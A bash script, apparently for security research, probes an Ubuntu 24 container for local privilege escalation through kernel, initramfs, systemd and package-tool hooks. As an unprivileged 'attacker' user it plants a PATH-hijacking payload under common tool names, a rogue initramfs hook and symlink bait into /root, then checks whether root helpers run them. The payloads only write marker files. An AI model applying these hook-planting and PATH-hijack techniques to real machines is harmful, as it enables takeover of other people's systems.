#!/usr/bin/env bash
set -Eeuo pipefail

TARGET="${1:-${TARGET:-ubuntu24-server-lpe-target}}"
ATTACKER="${ATTACKER:-attacker}"

SCRIPT_DIR="$(cd -- "$(dirname -- "${BASH_SOURCE[0]}")" && pwd)"
WORKSPACE="$(cd -- "$SCRIPT_DIR/.." && pwd)"
LOG="${LOG:-$WORKSPACE/logs/kernel-initramfs-hooks.out}"

mkdir -p "$(dirname -- "$LOG")"
: > "$LOG"
exec > >(tee -a "$LOG") 2>&1

section() {
  printf '\n## %s\n' "$1"
}

target_root() {
  local label="$1"
  section "$label"
  printf '$ docker exec -i %q bash -s\n' "$TARGET"
  docker exec -i -e ATTACKER="$ATTACKER" "$TARGET" bash -s
}

target_attacker() {
  local label="$1"
  section "$label"
  printf '$ docker exec -i %q runuser -u %q -- bash -s\n' "$TARGET" "$ATTACKER"
  docker exec -i -e ATTACKER="$ATTACKER" "$TARGET" runuser -u "$ATTACKER" -- bash -s
}

if [[ "$(docker inspect -f '{{.State.Running}}' "$TARGET" 2>/dev/null || true)" != "true" ]]; then
  echo "target container is not running: $TARGET" >&2
  exit 1
fi

echo "kernel/initramfs/update hook trust-boundary probe"
echo "target=$TARGET attacker=$ATTACKER"
date '+%Y-%m-%dT%H:%M:%S%z'

target_root "cleanup before probe" <<'TARGET'
set +e
probe=kernel_initramfs_hooks_probe
rm -rf "/home/${ATTACKER}/${probe}" \
       /tmp/${probe}* /var/tmp/${probe}* /run/lock/${probe}* \
       /root/${probe}* 2>/dev/null || true
systemctl reset-failed systemd-hwdb-update.service kmod-static-nodes.service \
  systemd-binfmt.service systemd-sysctl.service systemd-sysusers.service \
  systemd-modules-load.service 2>/dev/null || true
true
TARGET

target_root "target identity and default package proof" <<'TARGET'
set +e
echo "== identity =="
cat /etc/os-release
uname -a
ps -p 1 -o pid=,user=,comm=,args=
id "$ATTACKER"
runuser -u "$ATTACKER" -- bash -lc 'id; command -v sudo >/dev/null && sudo -n true; echo sudo_rc=$?' 2>&1

echo
echo "== package versions =="
for pkg in initramfs-tools initramfs-tools-core initramfs-tools-bin linux-base \
  kmod systemd udev procps ucf dpkg debconf dracut-install dracut-core \
  binfmt-support; do
  dpkg-query -W -f='${binary:Package}\t${Version}\t${db:Status-Abbrev}\n' "$pkg" 2>/dev/null ||
    printf '%s\t(not installed)\tun\n' "$pkg"
done | sort

echo
echo "== helper commands and modes =="
for c in kernel-install installkernel update-initramfs mkinitramfs depmod modprobe \
  systemd-hwdb systemd-sysusers sysctl update-alternatives ucf dpkg-trigger; do
  printf '%-24s ' "$c"
  command -v "$c" || true
done
for f in /usr/bin/kernel-install /usr/sbin/installkernel /usr/sbin/update-initramfs \
  /usr/sbin/mkinitramfs /usr/lib/dracut/dracut-install /usr/sbin/depmod \
  /usr/sbin/modprobe /usr/lib/systemd/systemd-modules-load \
  /usr/lib/systemd/systemd-sysctl /usr/bin/systemd-sysusers \
  /usr/lib/systemd/systemd-binfmt /usr/bin/systemd-hwdb /usr/sbin/sysctl \
  /usr/bin/update-alternatives /usr/bin/ucf /usr/bin/dpkg-trigger; do
  if [ -e "$f" ]; then
    stat -Lc '%A %a %U:%G %F %n' "$f"
    dpkg-query -S "$f" 2>/dev/null || true
  else
    echo "MISSING $f"
  fi
done
TARGET

target_root "default hook roots, units, and code paths" <<'TARGET'
set +e
echo "== initramfs hook roots =="
find /etc/initramfs-tools /usr/share/initramfs-tools -maxdepth 3 \( -type f -o -type d \) 2>/dev/null |
  sort | sed -n '1,240p'

echo
echo "== kernel install hooks =="
find /etc/kernel /usr/lib/kernel -maxdepth 4 \( -type f -o -type d \) 2>/dev/null |
  sort | sed -n '1,200p'

echo
echo "== module/sysctl/binfmt/sysusers/hwdb roots =="
for p in /etc/depmod.d /usr/lib/depmod.d /etc/modprobe.d /usr/lib/modprobe.d \
  /etc/modules-load.d /usr/lib/modules-load.d /etc/sysctl.d /usr/lib/sysctl.d \
  /etc/binfmt.d /usr/lib/binfmt.d /etc/sysusers.d /usr/lib/sysusers.d \
  /etc/udev/hwdb.d /usr/lib/udev/hwdb.d /var/lib/dpkg/triggers \
  /var/lib/ucf /etc/alternatives /var/lib/dpkg/alternatives /boot /tmp /var/tmp /run/lock; do
  if [ -e "$p" ]; then
    stat -Lc '%A %a %U:%G %F %n' "$p"
  else
    echo "MISSING $p"
  fi
done

echo
echo "== systemd units =="
for u in systemd-modules-load.service systemd-sysctl.service systemd-sysusers.service \
  systemd-binfmt.service systemd-hwdb-update.service kmod-static-nodes.service \
  initrd-cleanup.service initrd-parse-etc.service; do
  echo "### $u"
  systemctl show -p LoadState -p UnitFileState -p ActiveState -p SubState \
    -p Result -p ConditionResult -p FragmentPath -p User -p Group \
    -p ExecStart -p ExecStartPre -p ExecStartPost "$u" 2>&1 || true
done

echo
echo "== dpkg trigger metadata =="
grep -Hn 'update-initramfs' /var/lib/dpkg/info/*.triggers 2>/dev/null | sed -n '1,120p'

echo
echo "== vulnerable-looking code path lines =="
for f in /usr/sbin/update-initramfs /usr/sbin/mkinitramfs \
  /usr/share/initramfs-tools/hook-functions \
  /etc/kernel/postinst.d/initramfs-tools /etc/kernel/postrm.d/initramfs-tools \
  /etc/kernel/postinst.d/xx-update-initrd-links \
  /usr/lib/kernel/install.d/50-depmod.install \
  /usr/lib/kernel/install.d/55-initrd.install \
  /usr/lib/kernel/install.d/90-loaderentry.install \
  /usr/bin/kernel-install /usr/sbin/installkernel /usr/bin/ucf /usr/bin/ucfr; do
  echo "### $f"
  if [ -e "$f" ]; then
    grep -nE 'DPKG_MAINTSCRIPT_PACKAGE|dpkg-trigger|mkinitramfs|run-parts|mktemp|TMPDIR|PATH=|CONFDIR|conf.d|hooks|scripts|depmod|modprobe|KERNEL_INSTALL_CONF_ROOT|install.d|/var/lib/ucf|readlink|statedir|update-alternatives|ln |mv |cp |rm ' "$f" 2>/dev/null |
      sed -n '1,120p'
  else
    echo MISSING
  fi
done

echo
echo "== link protections =="
sysctl fs.protected_symlinks fs.protected_hardlinks fs.protected_fifos fs.protected_regular 2>/dev/null || true
TARGET

target_attacker "attacker writability and auth-gated root transitions" <<'ATTACKER'
set +e
probe=kernel_initramfs_hooks_probe
base="$HOME/$probe"
mkdir -p "$base"
echo "== attacker identity =="
id

echo
echo "== trust root writability =="
for p in /boot /etc/initramfs-tools /etc/initramfs-tools/conf.d \
  /etc/initramfs-tools/hooks /etc/initramfs-tools/scripts \
  /usr/share/initramfs-tools/hooks /etc/initramfs/post-update.d \
  /etc/kernel/postinst.d /etc/kernel/postrm.d /usr/lib/kernel/install.d \
  /etc/depmod.d /usr/lib/depmod.d /etc/modprobe.d /usr/lib/modprobe.d \
  /etc/modules-load.d /usr/lib/modules-load.d /etc/sysctl.d /usr/lib/sysctl.d \
  /etc/binfmt.d /usr/lib/binfmt.d /etc/sysusers.d /usr/lib/sysusers.d \
  /etc/udev/hwdb.d /usr/lib/udev/hwdb.d /var/lib/dpkg/triggers \
  /var/lib/ucf /etc/alternatives /var/lib/dpkg/alternatives /run/tmpfiles.d; do
  if [ -e "$p" ]; then
    if [ -w "$p" ]; then echo "W $p"; else echo "NO_W $p"; fi
    touch "$p/${probe}.touch" 2>&1 | sed "s#^#touch $p: #"
    rm -f "$p/${probe}.touch" 2>/dev/null || true
  else
    echo "MISSING $p"
  fi
done

echo
echo "== systemd manager env and unit starts as attacker =="
systemctl set-environment KERNEL_INITRAMFS_HOOKS_PROBE=1 TMPDIR="$base/tmp" \
  KERNEL_INSTALL_CONF_ROOT="$base/kernel-conf" PATH="$base/bin:/usr/bin:/usr/sbin:/bin:/sbin" 2>&1 |
  sed -n '1,8p'
for u in systemd-hwdb-update.service kmod-static-nodes.service systemd-binfmt.service \
  systemd-sysctl.service systemd-sysusers.service systemd-modules-load.service; do
  echo "### start $u"
  systemctl start "$u" 2>&1 | sed -n '1,8p'
done
ATTACKER

target_attacker "plant attacker-controlled hooks, env payloads, and symlink bait" <<'ATTACKER'
set -e
probe=kernel_initramfs_hooks_probe
base="$HOME/$probe"
rm -rf "$base"
mkdir -p "$base/bin" "$base/tmp" "$base/boot" "$base/out" "$base/initramfs/conf.d" \
  "$base/initramfs/hooks" "$base/initramfs/scripts" "$base/kernel-conf" \
  "$base/dracut-root" "$base/hwdb-root/etc/udev/hwdb.d" "$base/sysusers-root/usr/lib/sysusers.d" \
  "$base/altadmin" "$base/altdir" "$base/ucfstate"
cp -a /etc/initramfs-tools/initramfs.conf "$base/initramfs/initramfs.conf"
cp -a /etc/initramfs-tools/modules "$base/initramfs/modules"
printf 'probe cmdline\n' > "$base/kernel-conf/cmdline"
printf 'D %s-created-from-user 0755 root root -\n' "$probe" > "$base/sysusers-root/usr/lib/sysusers.d/${probe}.conf"
printf 'probe hwdb payload\n' > "$base/hwdb-root/etc/udev/hwdb.d/90-${probe}.hwdb"
printf '# probe vmlinuz placeholder\n' > "$base/vmlinuz"
printf '# probe map placeholder\n' > "$base/System.map"
printf 'new config\n' > "$base/new.conf"
printf 'old config\n' > "$base/dest.conf"

cat > "$base/bin/payload" <<'EOF'
#!/bin/sh
cmd="${0##*/}"
euid="$(/usr/bin/id -u 2>/dev/null || echo unknown)"
ruid="$(/usr/bin/id -ru 2>/dev/null || echo unknown)"
{
  printf 'PATH_PAYLOAD cmd=%s euid=%s ruid=%s argv=' "$cmd" "$euid" "$ruid"
  printf '%s ' "$@"
  printf '\n'
  /usr/bin/id
} >> /tmp/kernel_initramfs_hooks_probe_hits 2>&1
if [ "$euid" = "0" ]; then
  {
    echo "ROOT PATH PAYLOAD: $cmd"
    /usr/bin/id
  } > /root/kernel_initramfs_hooks_probe_root_marker 2>&1
fi
exit 127
EOF
chmod 755 "$base/bin/payload"
for name in mkinitramfs update-initramfs run-parts depmod modprobe kmod systemd-hwdb \
  systemd-sysusers systemctl linux-update-symlinks install cp mv rm ln chmod chown \
  mkdir mktemp touch grep sed awk find dirname basename readlink dpkg-trigger ucf \
  update-alternatives; do
  ln -sf payload "$base/bin/$name"
done

cat > "$base/initramfs/hooks/zz_${probe}" <<'EOF'
#!/bin/sh
if [ "${1:-}" = "prereqs" ]; then
  exit 0
fi
euid="$(/usr/bin/id -u 2>/dev/null || echo unknown)"
ruid="$(/usr/bin/id -ru 2>/dev/null || echo unknown)"
{
  echo "INITRAMFS_HOOK euid=${euid} ruid=${ruid} DESTDIR=${DESTDIR:-unset} CONFDIR=${CONFDIR:-unset}"
  /usr/bin/id
} >> /tmp/kernel_initramfs_hooks_probe_hits 2>&1
if [ "$euid" = "0" ]; then
  {
    echo "ROOT INITRAMFS HOOK"
    /usr/bin/id
  } > /root/kernel_initramfs_hooks_probe_root_marker 2>&1
fi
exit 0
EOF
chmod 755 "$base/initramfs/hooks/zz_${probe}"

ln -sf /root/kernel_initramfs_hooks_probe_symlink_target "/tmp/${probe}_tmp_link"
ln -sf /root/kernel_initramfs_hooks_probe_lock_target "/run/lock/${probe}_lock_link"
printf 'planted attacker state at %s\n' "$base"
find "$base" -maxdepth 3 \( -type f -o -type l -o -type d \) | sort | sed -n '1,160p'
ATTACKER

target_attacker "direct helper execution remains uid1001 only" <<'ATTACKER'
set +e
probe=kernel_initramfs_hooks_probe
base="$HOME/$probe"
fakepath="$base/bin:/usr/bin:/usr/sbin:/bin:/sbin"
echo "== direct update-initramfs with attacker PATH =="
env PATH="$fakepath" TMPDIR="$base/tmp" KERNEL_INSTALL_CONF_ROOT="$base/kernel-conf" \
  /usr/sbin/update-initramfs -c -k 0.0-probe -b "$base/boot" 2>&1 | /usr/bin/sed -n '1,30p'
echo "update_initramfs_rc=${PIPESTATUS[0]}"

echo
echo "== direct mkinitramfs with attacker CONFDIR =="
env PATH="$fakepath" TMPDIR="$base/tmp" \
  /usr/sbin/mkinitramfs -d "$base/initramfs" -o "$base/out/initrd.img-0.0-probe" 0.0-probe 2>&1 |
  /usr/bin/sed -n '1,40p'
echo "mkinitramfs_rc=${PIPESTATUS[0]}"

echo
echo "== direct installkernel/kernel-install =="
env PATH="$fakepath" TMPDIR="$base/tmp" KERNEL_INSTALL_CONF_ROOT="$base/kernel-conf" \
  /usr/sbin/installkernel 0.0-probe "$base/vmlinuz" "$base/System.map" 2>&1 | /usr/bin/sed -n '1,40p'
echo "installkernel_rc=${PIPESTATUS[0]}"
env PATH="$fakepath" TMPDIR="$base/tmp" KERNEL_INSTALL_CONF_ROOT="$base/kernel-conf" \
  /usr/bin/kernel-install add 0.0-probe "$base/vmlinuz" 2>&1 | /usr/bin/sed -n '1,40p'
echo "kernel_install_rc=${PIPESTATUS[0]}"

echo
echo "== direct kmod/module/cache helpers =="
env PATH="$fakepath" TMPDIR="$base/tmp" /usr/sbin/depmod -a 0.0-probe 2>&1 | /usr/bin/sed -n '1,20p'
echo "depmod_rc=${PIPESTATUS[0]}"
env PATH="$fakepath" TMPDIR="$base/tmp" /usr/sbin/modprobe -C "$base/modprobe.conf" fake_probe_module 2>&1 |
  /usr/bin/sed -n '1,20p'
echo "modprobe_rc=${PIPESTATUS[0]}"
env PATH="$fakepath" TMPDIR="$base/tmp" /usr/lib/dracut/dracut-install -D "$base/dracut-root" /bin/sh 2>&1 |
  /usr/bin/sed -n '1,20p'
echo "dracut_install_rc=${PIPESTATUS[0]}"

echo
echo "== direct systemd cache/config helpers =="
env PATH="$fakepath" TMPDIR="$base/tmp" /usr/bin/systemd-hwdb update --root "$base/hwdb-root" 2>&1 |
  /usr/bin/sed -n '1,20p'
echo "hwdb_rc=${PIPESTATUS[0]}"
env PATH="$fakepath" TMPDIR="$base/tmp" /usr/bin/systemd-sysusers --root="$base/sysusers-root" 2>&1 |
  /usr/bin/sed -n '1,20p'
echo "sysusers_rc=${PIPESTATUS[0]}"
env PATH="$fakepath" TMPDIR="$base/tmp" /usr/lib/systemd/systemd-binfmt --cat-config 2>&1 |
  /usr/bin/sed -n '1,20p'
echo "binfmt_cat_rc=${PIPESTATUS[0]}"
env PATH="$fakepath" TMPDIR="$base/tmp" /usr/lib/systemd/systemd-sysctl --cat-config 2>&1 |
  /usr/bin/sed -n '1,20p'
echo "sysctl_cat_rc=${PIPESTATUS[0]}"

echo
echo "== direct dpkg/ucf/alternatives helpers =="
env PATH="$fakepath" TMPDIR="$base/tmp" /usr/bin/dpkg-trigger --no-await update-initramfs 2>&1 |
  /usr/bin/sed -n '1,20p'
echo "dpkg_trigger_rc=${PIPESTATUS[0]}"
env PATH="$fakepath" TMPDIR="$base/tmp" /usr/bin/ucf --state-dir "$base/ucfstate" "$base/new.conf" "$base/dest.conf" 2>&1 |
  /usr/bin/sed -n '1,25p'
echo "ucf_own_state_rc=${PIPESTATUS[0]}"
env PATH="$fakepath" TMPDIR="$base/tmp" /usr/bin/ucf "$base/new.conf" /etc/kernel/cmdline 2>&1 |
  /usr/bin/sed -n '1,25p'
echo "ucf_root_dest_rc=${PIPESTATUS[0]}"
env PATH="$fakepath" TMPDIR="$base/tmp" /usr/bin/update-alternatives --admindir "$base/altadmin" --altdir "$base/altdir" \
  --install "$base/link" "${probe}_alt" "$base/vmlinuz" 10 2>&1 | /usr/bin/sed -n '1,25p'
echo "update_alternatives_own_rc=${PIPESTATUS[0]}"
env PATH="$fakepath" TMPDIR="$base/tmp" /usr/bin/update-alternatives --install /usr/local/bin/"${probe}" "${probe}" "$base/vmlinuz" 10 2>&1 |
  /usr/bin/sed -n '1,25p'
echo "update_alternatives_root_rc=${PIPESTATUS[0]}"

echo
echo "== attacker payload hits so far =="
/usr/bin/cat /tmp/kernel_initramfs_hooks_probe_hits 2>/dev/null || echo NO_HITS
[ -e /root/kernel_initramfs_hooks_probe_root_marker ] && echo "UNEXPECTED_ROOT_MARKER" || echo "NO_ROOT_MARKER_FROM_DIRECT_RUNS"
ATTACKER

target_root "root-started default rebuild/cache services after attacker state" <<'TARGET'
set +e
probe=kernel_initramfs_hooks_probe
echo "== systemd root service triggers =="
for u in systemd-hwdb-update.service kmod-static-nodes.service systemd-binfmt.service \
  systemd-sysctl.service systemd-sysusers.service systemd-modules-load.service; do
  echo "### root start $u"
  systemctl start "$u" 2>&1 | sed -n '1,12p'
  systemctl show -p ActiveState -p SubState -p Result -p ConditionResult "$u" 2>&1 || true
done

echo
echo "== root helper triggers with clean env and default trust roots =="
env -i HOME=/root LOGNAME=root PATH=/usr/bin:/usr/sbin:/bin:/sbin \
  /usr/sbin/update-initramfs -u -k all 2>&1 | sed -n '1,30p'
echo "root_update_initramfs_rc=${PIPESTATUS[0]}"
env -i HOME=/root LOGNAME=root PATH=/usr/bin:/usr/sbin:/bin:/sbin \
  /usr/sbin/mkinitramfs -o /tmp/${probe}_root_initrd.img 0.0-probe 2>&1 | sed -n '1,40p'
echo "root_mkinitramfs_rc=${PIPESTATUS[0]}"
mkdir -p /tmp/${probe}_dracut_root
env -i HOME=/root LOGNAME=root PATH=/usr/bin:/usr/sbin:/bin:/sbin \
  /usr/lib/dracut/dracut-install -D /tmp/${probe}_dracut_root /bin/sh 2>&1 | sed -n '1,20p'
echo "root_dracut_install_rc=${PIPESTATUS[0]}"
env -i HOME=/root LOGNAME=root PATH=/usr/bin:/usr/sbin:/bin:/sbin \
  /usr/sbin/depmod -a "$(uname -r)" 2>&1 | sed -n '1,20p'
echo "root_depmod_rc=${PIPESTATUS[0]}"

echo
echo "== root proof check =="
echo "-- payload hits --"
cat /tmp/${probe}_hits 2>/dev/null || echo NO_HITS
echo "-- root marker --"
if [ -e /root/${probe}_root_marker ]; then
  cat /root/${probe}_root_marker
  echo ROOT_MARKER_PRESENT
else
  echo NO_ROOT_MARKER
fi
echo "-- symlink bait --"
for p in /tmp/${probe}_tmp_link /run/lock/${probe}_lock_link; do
  if [ -L "$p" ]; then
    ls -l "$p"
  elif [ -e "$p" ]; then
    stat -Lc '%A %a %U:%G %F %n' "$p"
  else
    echo "MISSING $p"
  fi
done
systemctl reset-failed systemd-hwdb-update.service kmod-static-nodes.service \
  systemd-binfmt.service systemd-sysctl.service systemd-sysusers.service \
  systemd-modules-load.service 2>/dev/null || true
TARGET

target_root "cleanup after probe" <<'TARGET'
set +e
probe=kernel_initramfs_hooks_probe
rm -rf "/home/${ATTACKER}/${probe}" \
       /tmp/${probe}* /var/tmp/${probe}* /run/lock/${probe}* \
       /root/${probe}* 2>/dev/null || true
systemctl reset-failed systemd-hwdb-update.service kmod-static-nodes.service \
  systemd-binfmt.service systemd-sysctl.service systemd-sysusers.service \
  systemd-modules-load.service 2>/dev/null || true
echo "== leftover check =="
find /tmp /var/tmp /run/lock -maxdepth 1 -name "${probe}*" -print 2>/dev/null | sort
if find /tmp /var/tmp /run/lock -maxdepth 1 -name "${probe}*" -print 2>/dev/null | grep -q .; then
  echo LEFTOVERS_PRESENT
else
  echo cleanup_done
fi
echo "== target health =="
systemctl is-system-running || true
systemctl --failed --no-legend | sed -n '1,40p'
TARGET

echo
echo "kernel/initramfs hook probe complete"
